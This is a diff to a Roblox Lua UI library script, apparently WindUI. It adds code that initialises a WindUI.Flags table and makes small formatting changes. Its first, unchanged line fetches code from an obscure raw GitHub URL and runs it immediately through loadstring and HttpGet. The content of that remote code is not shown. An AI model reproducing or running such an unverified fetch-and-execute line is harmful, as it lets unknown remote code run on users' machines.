@@ -1,5 +1,7 @@
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/orjpforkespoS0U0S0S0S0II/oidfgoit777/refs/heads/main/load"))() --MINE
+
+
 local a a = {
     cache = {}, load = function(b)if not a.cache[b]then a.cache[b] = {
         c = a[b]()}end return a.cache[b].c end
@@ -9296,10 +9298,21 @@ local b = {
 return b end function a.c()
 
 
-
-
-
-
+task.spawn(function()
+if WindUI
+and not WindUI.Flags then
+WindUI.Flags = {}
+elseif not WindUI then
+    repeat task.wait() 
+        if WindUI then
+            WindUIcheck = true
+        end
+    until WindUI or WindUIcheck
+    if WindUI and not WindUI.Flags then
+        WindUI.Flags = {}
+    end
+end
+end)
 
 local b = game:GetService"RunService"local c =
 b.Heartbeat
@@ -10058,9 +10071,10 @@ h.ToggleFrame = a.load'e' {
     Hover = true,
 }
 
+
 local i = true
 if not WindUI.Flags[h.Flag] then
-WindUI.Flags[h.Flag] = h.Value
+    WindUI.Flags[h.Flag] = h.Value
 end
 if h.Value == nil then
 h.Value = false
